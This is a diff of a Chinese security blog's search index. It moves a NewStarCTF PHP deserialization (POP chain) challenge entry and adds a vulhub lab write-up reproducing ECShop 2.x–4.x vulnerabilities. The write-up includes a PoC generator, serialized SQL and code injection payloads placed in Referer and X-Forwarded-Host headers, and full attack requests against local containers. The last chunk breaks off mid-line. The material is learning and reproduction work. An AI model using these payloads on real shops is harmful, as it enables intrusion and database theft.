@@ -76,6 +76,28 @@
       </tags>
   </entry>
   <entry>
+    <title>BUUCTF-NewStar2023-Week3-POP Gadget</title>
+    <url>/2023/11/04/BUUCTF-NewStar2023-Week3-POP_Gadget/</url>
+    <content><![CDATA[<img data-src="D:/Typora/md_images/image-20231020205454603-1699068024385-1.png" style="zoom:67%;" />
+
+<p>进入题目</p>
+<p><img data-src="D:/Typora/md_images/image-20231104135906002-1699077564034-1.png"></p>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);   </span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure>
+
+<p>下面是POP的一些简介</p>
+<p><img data-src="D:/Typora/md_images/2293037-20210413224624099-855145573-1699068024385-3.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>POP链</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF-NewStar2023-Week4-More Fast</title>
     <url>/2023/10/27/BUUCTF-NewStar2023-Week4-More-Fast/</url>
     <content><![CDATA[<img data-src="https://s3.bmp.ovh/imgs/2023/10/28/34dbf8d94778b773.png" style="zoom:67%;" />
@@ -121,28 +143,6 @@
       <tags>
         <tag>CTF</tag>
         <tag>Writeup</tag>
-        <tag>POP链</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF-NewStar2023-Week3-POP Gadget</title>
-    <url>/2023/11/04/BUUCTF-NewStar2023-Week3-POP_Gadget/</url>
-    <content><![CDATA[<img data-src="D:/Typora/md_images/image-20231020205454603-1699068024385-1.png" style="zoom:67%;" />
-
-<p>进入题目</p>
-<p><img data-src="D:/Typora/md_images/image-20231104135906002-1699077564034-1.png"></p>
-<p>代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);   </span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure>
-
-<p>下面是POP的一些简介</p>
-<p><img data-src="D:/Typora/md_images/2293037-20210413224624099-855145573-1699068024385-3.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
         <tag>POP链</tag>
       </tags>
   </entry>
@@ -245,6 +245,11 @@
         <tag>Http</tag>
         <tag>状态码</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Linux使用GPG加密文件</title>
+    <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>SQLmap使用</title>
@@ -708,6 +713,82 @@
         <tag>CTF</tag>
         <tag>PHP</tag>
         <tag>伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ecShop漏洞复现</title>
+    <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="ecShop漏洞复现"><a href="#ecShop漏洞复现" class="headerlink" title="ecShop漏洞复现"></a>ecShop漏洞复现</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
+<p>启动docker容器</p>
+<img data-src="https://images.gaifagafin.top/202311082306552.png" style="zoom: 80%;" />
+
+<p>下面是ecshop2.X和3.X对应的端口映射</p>
+<img data-src="https://images.gaifagafin.top/202311082306615.png" style="zoom:67%;" />
+
+<img data-src="https://images.gaifagafin.top/202311082306822.png" style="zoom:67%;" />
+
+<p>输入<code>localhost:5004</code>安装ecshop2.X</p>
+<img data-src="https://images.gaifagafin.top/202311082306528.png" style="zoom:67%;" />
+
+<p>点击下一步</p>
+<img data-src="https://images.gaifagafin.top/202311082306521.png" style="zoom:67%;" />
+
+<p>继续点击下一步</p>
+<img data-src="https://images.gaifagafin.top/202311082307573.png" style="zoom:67%;" />
+
+<p>数据主机填<code>mysql</code>,其他随便填，点击立即安装</p>
+<img data-src="https://images.gaifagafin.top/202311082307278.png" style="zoom:67%;" />
+
+<p>安装成功</p>
+<img data-src="https://images.gaifagafin.top/202311082307228.png" style="zoom:67%;" />
+
+<p>浏览器输入localhost:5004,出现上面的页面则成功安装</p>
+<p>接下来安装ecshop3.X，步骤跟安装2.X一样，只不过安装完成后的页面是</p>
+<img data-src="https://images.gaifagafin.top/202311082307551.png" style="zoom:67%;" />
+
+<p>实际上是安装成功了的</p>
+<img data-src="https://images.gaifagafin.top/202311082307299.png" style="zoom:67%;" />
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ecshop2-X漏洞利用"><a href="#ecshop2-X漏洞利用" class="headerlink" title="ecshop2.X漏洞利用"></a>ecshop2.X漏洞利用</h3><p>漏洞利用参考:<a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></p>
+<p>根据官方文档的PHP脚本生成POC</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;&#123;\$asd&#x27;];phpinfo\t();//&#125;xxx&quot;</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&quot;-1&#x27; UNION/*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&quot;num&quot;</span> =&gt; <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;</span>, <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$id</span>), <span class="variable">$shell</span>),</span><br><span class="line">    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hash3</span> = <span class="string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;</span><br><span class="line"><span class="variable">$hash2</span> = <span class="string">&#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;POC for ECShop 2.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash2&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash2&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash3&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash3&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>得到POC</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POC <span class="keyword">for</span> ECShop <span class="number">2</span>.x: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line">POC <span class="keyword">for</span> ECShop <span class="number">3</span>.x: <span class="number">45</span>ea207d7a2b68c49582d2d22adf953aads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">45</span>ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
+
+<p>利用burpsuite抓包将POC的内容添加到referer</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5004</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=2; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<img data-src="https://images.gaifagafin.top/202311082307103.png" style="zoom:67%;" />
+
+<h3 id="ecshop3-X漏洞利用"><a href="#ecshop3-X漏洞利用" class="headerlink" title="ecshop3.X漏洞利用"></a>ecshop3.X漏洞利用</h3><p>利用burpsuite抓包将上面POC的内容添加到referer</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:5005</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=3; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<img data-src="https://images.gaifagafin.top/202311082307207.png" style="zoom: 67%;" />
+
+<h3 id="ecshop4-x漏洞利用"><a href="#ecshop4-x漏洞利用" class="headerlink" title="ecshop4.x漏洞利用"></a>ecshop4.x漏洞利用</h3><p>漏洞环境搭建同前面一样</p>
+<p>参考文档:<a href="https://vulhub.org/#/environments/ecshop/collection_list-sqli/">https://vulhub.org/#/environments/ecshop/collection_list-sqli/</a></p>
+<p>要利用漏洞首先要注册为一个普通用户，信息随便填</p>
+<img data-src="https://images.gaifagafin.top/202311082307371.png" style="zoom:67%;" />
+
+<p>根据参考文档抓包，在包里添加字段</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=collection_list</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:5003</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=4; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=53ae5332f431fa0b2d246a06d90dbf70b68310ff; real_ipd=172.22.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>回显界面如下，得到当前数据库用户</p>
+<img data-src="https://images.gaifagafin.top/202311082307656.png" style="zoom:80%;" />
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1240,82 +1321,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ecShop漏洞复现</title>
-    <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="ecShop漏洞复现"><a href="#ecShop漏洞复现" class="headerlink" title="ecShop漏洞复现"></a>ecShop漏洞复现</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
-<p>启动docker容器</p>
-<img data-src="https://images.gaifagafin.top/202311082306552.png" style="zoom: 80%;" />
-
-<p>下面是ecshop2.X和3.X对应的端口映射</p>
-<img data-src="https://images.gaifagafin.top/202311082306615.png" style="zoom:67%;" />
-
-<img data-src="https://images.gaifagafin.top/202311082306822.png" style="zoom:67%;" />
-
-<p>输入<code>localhost:5004</code>安装ecshop2.X</p>
-<img data-src="https://images.gaifagafin.top/202311082306528.png" style="zoom:67%;" />
-
-<p>点击下一步</p>
-<img data-src="https://images.gaifagafin.top/202311082306521.png" style="zoom:67%;" />
-
-<p>继续点击下一步</p>
-<img data-src="https://images.gaifagafin.top/202311082307573.png" style="zoom:67%;" />
-
-<p>数据主机填<code>mysql</code>,其他随便填，点击立即安装</p>
-<img data-src="https://images.gaifagafin.top/202311082307278.png" style="zoom:67%;" />
-
-<p>安装成功</p>
-<img data-src="https://images.gaifagafin.top/202311082307228.png" style="zoom:67%;" />
-
-<p>浏览器输入localhost:5004,出现上面的页面则成功安装</p>
-<p>接下来安装ecshop3.X，步骤跟安装2.X一样，只不过安装完成后的页面是</p>
-<img data-src="https://images.gaifagafin.top/202311082307551.png" style="zoom:67%;" />
-
-<p>实际上是安装成功了的</p>
-<img data-src="https://images.gaifagafin.top/202311082307299.png" style="zoom:67%;" />
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ecshop2-X漏洞利用"><a href="#ecshop2-X漏洞利用" class="headerlink" title="ecshop2.X漏洞利用"></a>ecshop2.X漏洞利用</h3><p>漏洞利用参考:<a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></p>
-<p>根据官方文档的PHP脚本生成POC</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;&#123;\$asd&#x27;];phpinfo\t();//&#125;xxx&quot;</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&quot;-1&#x27; UNION/*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&quot;num&quot;</span> =&gt; <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;</span>, <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$id</span>), <span class="variable">$shell</span>),</span><br><span class="line">    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hash3</span> = <span class="string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;</span><br><span class="line"><span class="variable">$hash2</span> = <span class="string">&#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;POC for ECShop 2.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span 